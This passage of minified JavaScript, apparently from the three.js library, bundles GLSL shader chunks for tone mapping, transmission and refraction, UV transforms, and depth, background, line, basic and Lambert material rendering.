		vec3( - 0.016493938717834573, - 0.016493938717834257, 1.2519364065950405 )
	);
	const float AgxMinEv = - 12.47393;	const float AgxMaxEv = 4.026069;
	color *= toneMappingExposure;
	color = LINEAR_SRGB_TO_LINEAR_REC2020 * color;
	color = AgXInsetMatrix * color;
	color = max( color, 1e-10 );	color = log2( color );
	color = ( color - AgxMinEv ) / ( AgxMaxEv - AgxMinEv );
	color = clamp( color, 0.0, 1.0 );
	color = agxDefaultContrastApprox( color );
	color = AgXOutsetMatrix * color;
	color = pow( max( vec3( 0.0 ), color ), vec3( 2.2 ) );
	color = LINEAR_REC2020_TO_LINEAR_SRGB * color;
	color = clamp( color, 0.0, 1.0 );
	return color;
}
vec3 NeutralToneMapping( vec3 color ) {
	const float StartCompression = 0.8 - 0.04;
	const float Desaturation = 0.15;
	color *= toneMappingExposure;
	float x = min( color.r, min( color.g, color.b ) );
	float offset = x < 0.08 ? x - 6.25 * x * x : 0.04;
	color -= offset;
	float peak = max( color.r, max( color.g, color.b ) );
	if ( peak < StartCompression ) return color;
	float d = 1. - StartCompression;
	float newPeak = 1. - d * d / ( peak + d - StartCompression );
	color *= newPeak / peak;
	float g = 1. - 1. / ( Desaturation * ( peak - newPeak ) + 1. );
	return mix( color, vec3( newPeak ), g );
}
vec3 CustomToneMapping( vec3 color ) { return color; }`,ZM=`#ifdef USE_TRANSMISSION
	material.transmission = transmission;
	material.transmissionAlpha = 1.0;
	material.thickness = thickness;
	material.attenuationDistance = attenuationDistance;
	material.attenuationColor = attenuationColor;
	#ifdef USE_TRANSMISSIONMAP
		material.transmission *= texture2D( transmissionMap, vTransmissionMapUv ).r;
	#endif
	#ifdef USE_THICKNESSMAP
		material.thickness *= texture2D( thicknessMap, vThicknessMapUv ).g;
	#endif
	vec3 pos = vWorldPosition;
	vec3 v = normalize( cameraPosition - pos );
	vec3 n = inverseTransformDirection( normal, viewMatrix );
	vec4 transmitted = getIBLVolumeRefraction(
		n, v, material.roughness, material.diffuseContribution, material.specularColorBlended, material.specularF90,
		pos, modelMatrix, viewMatrix, projectionMatrix, material.dispersion, material.ior, material.thickness,
		material.attenuationColor, material.attenuationDistance );
	material.transmissionAlpha = mix( material.transmissionAlpha, transmitted.a, material.transmission );
	totalDiffuse = mix( totalDiffuse, transmitted.rgb, material.transmission );
#endif`,JM=`#ifdef USE_TRANSMISSION
	uniform float transmission;
	uniform float thickness;
	uniform float attenuationDistance;
	uniform vec3 attenuationColor;
	#ifdef USE_TRANSMISSIONMAP
		uniform sampler2D transmissionMap;
	#endif
	#ifdef USE_THICKNESSMAP
		uniform sampler2D thicknessMap;
	#endif
	uniform vec2 transmissionSamplerSize;
	uniform sampler2D transmissionSamplerMap;
	uniform mat4 modelMatrix;
	uniform mat4 projectionMatrix;
	varying vec3 vWorldPosition;
	float w0( float a ) {
		return ( 1.0 / 6.0 ) * ( a * ( a * ( - a + 3.0 ) - 3.0 ) + 1.0 );
	}
	float w1( float a ) {
		return ( 1.0 / 6.0 ) * ( a *  a * ( 3.0 * a - 6.0 ) + 4.0 );
	}
	float w2( float a ){
		return ( 1.0 / 6.0 ) * ( a * ( a * ( - 3.0 * a + 3.0 ) + 3.0 ) + 1.0 );
	}
	float w3( float a ) {
		return ( 1.0 / 6.0 ) * ( a * a * a );
	}
	float g0( float a ) {
		return w0( a ) + w1( a );
	}
	float g1( float a ) {
		return w2( a ) + w3( a );
	}
	float h0( float a ) {
		return - 1.0 + w1( a ) / ( w0( a ) + w1( a ) );
	}
	float h1( float a ) {
		return 1.0 + w3( a ) / ( w2( a ) + w3( a ) );
	}
	vec4 bicubic( sampler2D tex, vec2 uv, vec4 texelSize, float lod ) {
		uv = uv * texelSize.zw + 0.5;
		vec2 iuv = floor( uv );
		vec2 fuv = fract( uv );
		float g0x = g0( fuv.x );
		float g1x = g1( fuv.x );
		float h0x = h0( fuv.x );
		float h1x = h1( fuv.x );
		float h0y = h0( fuv.y );
		float h1y = h1( fuv.y );
		vec2 p0 = ( vec2( iuv.x + h0x, iuv.y + h0y ) - 0.5 ) * texelSize.xy;
		vec2 p1 = ( vec2( iuv.x + h1x, iuv.y + h0y ) - 0.5 ) * texelSize.xy;
		vec2 p2 = ( vec2( iuv.x + h0x, iuv.y + h1y ) - 0.5 ) * texelSize.xy;
		vec2 p3 = ( vec2( iuv.x + h1x, iuv.y + h1y ) - 0.5 ) * texelSize.xy;
		return g0( fuv.y ) * ( g0x * textureLod( tex, p0, lod ) + g1x * textureLod( tex, p1, lod ) ) +
			g1( fuv.y ) * ( g0x * textureLod( tex, p2, lod ) + g1x * textureLod( tex, p3, lod ) );
	}
	vec4 textureBicubic( sampler2D sampler, vec2 uv, float lod ) {
		vec2 fLodSize = vec2( textureSize( sampler, int( lod ) ) );
		vec2 cLodSize = vec2( textureSize( sampler, int( lod + 1.0 ) ) );
		vec2 fLodSizeInv = 1.0 / fLodSize;
		vec2 cLodSizeInv = 1.0 / cLodSize;
		vec4 fSample = bicubic( sampler, uv, vec4( fLodSizeInv, fLodSize ), floor( lod ) );
		vec4 cSample = bicubic( sampler, uv, vec4( cLodSizeInv, cLodSize ), ceil( lod ) );
		return mix( fSample, cSample, fract( lod ) );
	}
	vec3 getVolumeTransmissionRay( const in vec3 n, const in vec3 v, const in float thickness, const in float ior, const in mat4 modelMatrix ) {
		vec3 refractionVector = refract( - v, normalize( n ), 1.0 / ior );
		vec3 modelScale;
		modelScale.x = length( vec3( modelMatrix[ 0 ].xyz ) );
		modelScale.y = length( vec3( modelMatrix[ 1 ].xyz ) );
		modelScale.z = length( vec3( modelMatrix[ 2 ].xyz ) );
		return normalize( refractionVector ) * thickness * modelScale;
	}
	float applyIorToRoughness( const in float roughness, const in float ior ) {
		return roughness * clamp( ior * 2.0 - 2.0, 0.0, 1.0 );
	}
	vec4 getTransmissionSample( const in vec2 fragCoord, const in float roughness, const in float ior ) {
		float lod = log2( transmissionSamplerSize.x ) * applyIorToRoughness( roughness, ior );
		return textureBicubic( transmissionSamplerMap, fragCoord.xy, lod );
	}
	vec3 volumeAttenuation( const in float transmissionDistance, const in vec3 attenuationColor, const in float attenuationDistance ) {
		if ( isinf( attenuationDistance ) ) {
			return vec3( 1.0 );
		} else {
			vec3 attenuationCoefficient = -log( attenuationColor ) / attenuationDistance;
			vec3 transmittance = exp( - attenuationCoefficient * transmissionDistance );			return transmittance;
		}
	}
	vec4 getIBLVolumeRefraction( const in vec3 n, const in vec3 v, const in float roughness, const in vec3 diffuseColor,
		const in vec3 specularColor, const in float specularF90, const in vec3 position, const in mat4 modelMatrix,
		const in mat4 viewMatrix, const in mat4 projMatrix, const in float dispersion, const in float ior, const in float thickness,
		const in vec3 attenuationColor, const in float attenuationDistance ) {
		vec4 transmittedLight;
		vec3 transmittance;
		#ifdef USE_DISPERSION
			float halfSpread = ( ior - 1.0 ) * 0.025 * dispersion;
			vec3 iors = vec3( ior - halfSpread, ior, ior + halfSpread );
			for ( int i = 0; i < 3; i ++ ) {
				vec3 transmissionRay = getVolumeTransmissionRay( n, v, thickness, iors[ i ], modelMatrix );
				vec3 refractedRayExit = position + transmissionRay;
				vec4 ndcPos = projMatrix * viewMatrix * vec4( refractedRayExit, 1.0 );
				vec2 refractionCoords = ndcPos.xy / ndcPos.w;
				refractionCoords += 1.0;
				refractionCoords /= 2.0;
				vec4 transmissionSample = getTransmissionSample( refractionCoords, roughness, iors[ i ] );
				transmittedLight[ i ] = transmissionSample[ i ];
				transmittedLight.a += transmissionSample.a;
				transmittance[ i ] = diffuseColor[ i ] * volumeAttenuation( length( transmissionRay ), attenuationColor, attenuationDistance )[ i ];
			}
			transmittedLight.a /= 3.0;
		#else
			vec3 transmissionRay = getVolumeTransmissionRay( n, v, thickness, ior, modelMatrix );
			vec3 refractedRayExit = position + transmissionRay;
			vec4 ndcPos = projMatrix * viewMatrix * vec4( refractedRayExit, 1.0 );
			vec2 refractionCoords = ndcPos.xy / ndcPos.w;
			refractionCoords += 1.0;
			refractionCoords /= 2.0;
			transmittedLight = getTransmissionSample( refractionCoords, roughness, ior );
			transmittance = diffuseColor * volumeAttenuation( length( transmissionRay ), attenuationColor, attenuationDistance );
		#endif
		vec3 attenuatedColor = transmittance * transmittedLight.rgb;
		vec3 F = EnvironmentBRDF( n, v, specularColor, specularF90, roughness );
		float transmittanceFactor = ( transmittance.r + transmittance.g + transmittance.b ) / 3.0;
		return vec4( ( 1.0 - F ) * attenuatedColor, 1.0 - ( 1.0 - transmittedLight.a ) * transmittanceFactor );
	}
#endif`,QM=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	varying vec2 vUv;
#endif
#ifdef USE_MAP
	varying vec2 vMapUv;
#endif
#ifdef USE_ALPHAMAP
	varying vec2 vAlphaMapUv;
#endif
#ifdef USE_LIGHTMAP
	varying vec2 vLightMapUv;
#endif
#ifdef USE_AOMAP
	varying vec2 vAoMapUv;
#endif
#ifdef USE_BUMPMAP
	varying vec2 vBumpMapUv;
#endif
#ifdef USE_NORMALMAP
	varying vec2 vNormalMapUv;
#endif
#ifdef USE_EMISSIVEMAP
	varying vec2 vEmissiveMapUv;
#endif
#ifdef USE_METALNESSMAP
	varying vec2 vMetalnessMapUv;
#endif
#ifdef USE_ROUGHNESSMAP
	varying vec2 vRoughnessMapUv;
#endif
#ifdef USE_ANISOTROPYMAP
	varying vec2 vAnisotropyMapUv;
#endif
#ifdef USE_CLEARCOATMAP
	varying vec2 vClearcoatMapUv;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	varying vec2 vClearcoatNormalMapUv;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	varying vec2 vClearcoatRoughnessMapUv;
#endif
#ifdef USE_IRIDESCENCEMAP
	varying vec2 vIridescenceMapUv;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	varying vec2 vIridescenceThicknessMapUv;
#endif
#ifdef USE_SHEEN_COLORMAP
	varying vec2 vSheenColorMapUv;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	varying vec2 vSheenRoughnessMapUv;
#endif
#ifdef USE_SPECULARMAP
	varying vec2 vSpecularMapUv;
#endif
#ifdef USE_SPECULAR_COLORMAP
	varying vec2 vSpecularColorMapUv;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	varying vec2 vSpecularIntensityMapUv;
#endif
#ifdef USE_TRANSMISSIONMAP
	uniform mat3 transmissionMapTransform;
	varying vec2 vTransmissionMapUv;
#endif
#ifdef USE_THICKNESSMAP
	uniform mat3 thicknessMapTransform;
	varying vec2 vThicknessMapUv;
#endif`,e1=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	varying vec2 vUv;
#endif
#ifdef USE_MAP
	uniform mat3 mapTransform;
	varying vec2 vMapUv;
#endif
#ifdef USE_ALPHAMAP
	uniform mat3 alphaMapTransform;
	varying vec2 vAlphaMapUv;
#endif
#ifdef USE_LIGHTMAP
	uniform mat3 lightMapTransform;
	varying vec2 vLightMapUv;
#endif
#ifdef USE_AOMAP
	uniform mat3 aoMapTransform;
	varying vec2 vAoMapUv;
#endif
#ifdef USE_BUMPMAP
	uniform mat3 bumpMapTransform;
	varying vec2 vBumpMapUv;
#endif
#ifdef USE_NORMALMAP
	uniform mat3 normalMapTransform;
	varying vec2 vNormalMapUv;
#endif
#ifdef USE_DISPLACEMENTMAP
	uniform mat3 displacementMapTransform;
	varying vec2 vDisplacementMapUv;
#endif
#ifdef USE_EMISSIVEMAP
	uniform mat3 emissiveMapTransform;
	varying vec2 vEmissiveMapUv;
#endif
#ifdef USE_METALNESSMAP
	uniform mat3 metalnessMapTransform;
	varying vec2 vMetalnessMapUv;
#endif
#ifdef USE_ROUGHNESSMAP
	uniform mat3 roughnessMapTransform;
	varying vec2 vRoughnessMapUv;
#endif
#ifdef USE_ANISOTROPYMAP
	uniform mat3 anisotropyMapTransform;
	varying vec2 vAnisotropyMapUv;
#endif
#ifdef USE_CLEARCOATMAP
	uniform mat3 clearcoatMapTransform;
	varying vec2 vClearcoatMapUv;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	uniform mat3 clearcoatNormalMapTransform;
	varying vec2 vClearcoatNormalMapUv;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	uniform mat3 clearcoatRoughnessMapTransform;
	varying vec2 vClearcoatRoughnessMapUv;
#endif
#ifdef USE_SHEEN_COLORMAP
	uniform mat3 sheenColorMapTransform;
	varying vec2 vSheenColorMapUv;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	uniform mat3 sheenRoughnessMapTransform;
	varying vec2 vSheenRoughnessMapUv;
#endif
#ifdef USE_IRIDESCENCEMAP
	uniform mat3 iridescenceMapTransform;
	varying vec2 vIridescenceMapUv;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	uniform mat3 iridescenceThicknessMapTransform;
	varying vec2 vIridescenceThicknessMapUv;
#endif
#ifdef USE_SPECULARMAP
	uniform mat3 specularMapTransform;
	varying vec2 vSpecularMapUv;
#endif
#ifdef USE_SPECULAR_COLORMAP
	uniform mat3 specularColorMapTransform;
	varying vec2 vSpecularColorMapUv;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	uniform mat3 specularIntensityMapTransform;
	varying vec2 vSpecularIntensityMapUv;
#endif
#ifdef USE_TRANSMISSIONMAP
	uniform mat3 transmissionMapTransform;
	varying vec2 vTransmissionMapUv;
#endif
#ifdef USE_THICKNESSMAP
	uniform mat3 thicknessMapTransform;
	varying vec2 vThicknessMapUv;
#endif`,t1=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	vUv = vec3( uv, 1 ).xy;
#endif
#ifdef USE_MAP
	vMapUv = ( mapTransform * vec3( MAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ALPHAMAP
	vAlphaMapUv = ( alphaMapTransform * vec3( ALPHAMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_LIGHTMAP
	vLightMapUv = ( lightMapTransform * vec3( LIGHTMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_AOMAP
	vAoMapUv = ( aoMapTransform * vec3( AOMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_BUMPMAP
	vBumpMapUv = ( bumpMapTransform * vec3( BUMPMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_NORMALMAP
	vNormalMapUv = ( normalMapTransform * vec3( NORMALMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_DISPLACEMENTMAP
	vDisplacementMapUv = ( displacementMapTransform * vec3( DISPLACEMENTMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_EMISSIVEMAP
	vEmissiveMapUv = ( emissiveMapTransform * vec3( EMISSIVEMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_METALNESSMAP
	vMetalnessMapUv = ( metalnessMapTransform * vec3( METALNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ROUGHNESSMAP
	vRoughnessMapUv = ( roughnessMapTransform * vec3( ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ANISOTROPYMAP
	vAnisotropyMapUv = ( anisotropyMapTransform * vec3( ANISOTROPYMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOATMAP
	vClearcoatMapUv = ( clearcoatMapTransform * vec3( CLEARCOATMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	vClearcoatNormalMapUv = ( clearcoatNormalMapTransform * vec3( CLEARCOAT_NORMALMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	vClearcoatRoughnessMapUv = ( clearcoatRoughnessMapTransform * vec3( CLEARCOAT_ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_IRIDESCENCEMAP
	vIridescenceMapUv = ( iridescenceMapTransform * vec3( IRIDESCENCEMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	vIridescenceThicknessMapUv = ( iridescenceThicknessMapTransform * vec3( IRIDESCENCE_THICKNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SHEEN_COLORMAP
	vSheenColorMapUv = ( sheenColorMapTransform * vec3( SHEEN_COLORMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	vSheenRoughnessMapUv = ( sheenRoughnessMapTransform * vec3( SHEEN_ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULARMAP
	vSpecularMapUv = ( specularMapTransform * vec3( SPECULARMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULAR_COLORMAP
	vSpecularColorMapUv = ( specularColorMapTransform * vec3( SPECULAR_COLORMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	vSpecularIntensityMapUv = ( specularIntensityMapTransform * vec3( SPECULAR_INTENSITYMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_TRANSMISSIONMAP
	vTransmissionMapUv = ( transmissionMapTransform * vec3( TRANSMISSIONMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_THICKNESSMAP
	vThicknessMapUv = ( thicknessMapTransform * vec3( THICKNESSMAP_UV, 1 ) ).xy;
#endif`,n1=`#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP ) || defined ( USE_TRANSMISSION ) || NUM_SPOT_LIGHT_COORDS > 0
	vec4 worldPosition = vec4( transformed, 1.0 );
	#ifdef USE_BATCHING
		worldPosition = batchingMatrix * worldPosition;
	#endif
	#ifdef USE_INSTANCING
		worldPosition = instanceMatrix * worldPosition;
	#endif
	worldPosition = modelMatrix * worldPosition;
#endif`;const i1=`varying vec2 vUv;
uniform mat3 uvTransform;
void main() {
	vUv = ( uvTransform * vec3( uv, 1 ) ).xy;
	gl_Position = vec4( position.xy, 1.0, 1.0 );
}`,s1=`uniform sampler2D t2D;
uniform float backgroundIntensity;
varying vec2 vUv;
void main() {
	vec4 texColor = texture2D( t2D, vUv );
	#ifdef DECODE_VIDEO_TEXTURE
		texColor = vec4( mix( pow( texColor.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), texColor.rgb * 0.0773993808, vec3( lessThanEqual( texColor.rgb, vec3( 0.04045 ) ) ) ), texColor.w );
	#endif
	texColor.rgb *= backgroundIntensity;
	gl_FragColor = texColor;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,r1=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
	gl_Position.z = gl_Position.w;
}`,a1=`#ifdef ENVMAP_TYPE_CUBE
	uniform samplerCube envMap;
#elif defined( ENVMAP_TYPE_CUBE_UV )
	uniform sampler2D envMap;
#endif
uniform float flipEnvMap;
uniform float backgroundBlurriness;
uniform float backgroundIntensity;
uniform mat3 backgroundRotation;
varying vec3 vWorldDirection;
#include <cube_uv_reflection_fragment>
void main() {
	#ifdef ENVMAP_TYPE_CUBE
		vec4 texColor = textureCube( envMap, backgroundRotation * vec3( flipEnvMap * vWorldDirection.x, vWorldDirection.yz ) );
	#elif defined( ENVMAP_TYPE_CUBE_UV )
		vec4 texColor = textureCubeUV( envMap, backgroundRotation * vWorldDirection, backgroundBlurriness );
	#else
		vec4 texColor = vec4( 0.0, 0.0, 0.0, 1.0 );
	#endif
	texColor.rgb *= backgroundIntensity;
	gl_FragColor = texColor;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,o1=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
	gl_Position.z = gl_Position.w;
}`,l1=`uniform samplerCube tCube;
uniform float tFlip;
uniform float opacity;
varying vec3 vWorldDirection;
void main() {
	vec4 texColor = textureCube( tCube, vec3( tFlip * vWorldDirection.x, vWorldDirection.yz ) );
	gl_FragColor = texColor;
	gl_FragColor.a *= opacity;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,c1=`#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
varying vec2 vHighPrecisionZW;
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <skinbase_vertex>
	#include <morphinstance_vertex>
	#ifdef USE_DISPLACEMENTMAP
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vHighPrecisionZW = gl_Position.zw;
}`,u1=`#if DEPTH_PACKING == 3200
	uniform float opacity;
#endif
#include <common>
#include <packing>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
varying vec2 vHighPrecisionZW;
void main() {
	vec4 diffuseColor = vec4( 1.0 );
	#include <clipping_planes_fragment>
	#if DEPTH_PACKING == 3200
		diffuseColor.a = opacity;
	#endif
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <logdepthbuf_fragment>
	#ifdef USE_REVERSED_DEPTH_BUFFER
		float fragCoordZ = vHighPrecisionZW[ 0 ] / vHighPrecisionZW[ 1 ];
	#else
		float fragCoordZ = 0.5 * vHighPrecisionZW[ 0 ] / vHighPrecisionZW[ 1 ] + 0.5;
	#endif
	#if DEPTH_PACKING == 3200
		gl_FragColor = vec4( vec3( 1.0 - fragCoordZ ), opacity );
	#elif DEPTH_PACKING == 3201
		gl_FragColor = packDepthToRGBA( fragCoordZ );
	#elif DEPTH_PACKING == 3202
		gl_FragColor = vec4( packDepthToRGB( fragCoordZ ), 1.0 );
	#elif DEPTH_PACKING == 3203
		gl_FragColor = vec4( packDepthToRG( fragCoordZ ), 0.0, 1.0 );
	#endif
}`,d1=`#define DISTANCE
varying vec3 vWorldPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <skinbase_vertex>
	#include <morphinstance_vertex>
	#ifdef USE_DISPLACEMENTMAP
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <worldpos_vertex>
	#include <clipping_planes_vertex>
	vWorldPosition = worldPosition.xyz;
}`,p1=`#define DISTANCE
uniform vec3 referencePosition;
uniform float nearDistance;
uniform float farDistance;
varying vec3 vWorldPosition;
#include <common>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <clipping_planes_pars_fragment>
void main () {
	vec4 diffuseColor = vec4( 1.0 );
	#include <clipping_planes_fragment>
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	float dist = length( vWorldPosition - referencePosition );
	dist = ( dist - nearDistance ) / ( farDistance - nearDistance );
	dist = saturate( dist );
	gl_FragColor = vec4( dist, 0.0, 0.0, 1.0 );
}`,h1=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
}`,f1=`uniform sampler2D tEquirect;
varying vec3 vWorldDirection;
#include <common>
void main() {
	vec3 direction = normalize( vWorldDirection );
	vec2 sampleUV = equirectUv( direction );
	gl_FragColor = texture2D( tEquirect, sampleUV );
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,m1=`uniform float scale;
attribute float lineDistance;
varying float vLineDistance;
#include <common>
#include <uv_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	vLineDistance = scale * lineDistance;
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
}`,g1=`uniform vec3 diffuse;
uniform float opacity;
uniform float dashSize;
uniform float totalSize;
varying float vLineDistance;
#include <common>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	if ( mod( vLineDistance, totalSize ) > dashSize ) {
		discard;
	}
	vec3 outgoingLight = vec3( 0.0 );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,v1=`#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#if defined ( USE_ENVMAP ) || defined ( USE_SKINNING )
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinbase_vertex>
		#include <skinnormal_vertex>
		#include <defaultnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <fog_vertex>
}`,_1=`uniform vec3 diffuse;
uniform float opacity;
#ifndef FLAT_SHADED
	varying vec3 vNormal;
#endif
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	#ifdef USE_LIGHTMAP
		vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
		reflectedLight.indirectDiffuse += lightMapTexel.rgb * lightMapIntensity * RECIPROCAL_PI;
	#else
		reflectedLight.indirectDiffuse += vec3( 1.0 );
	#endif
	#include <aomap_fragment>
	reflectedLight.indirectDiffuse *= diffuseColor.rgb;
	vec3 outgoingLight = reflectedLight.indirectDiffuse;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,x1=`#define LAMBERT
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,y1=`#define LAMBERT
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float opacity;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
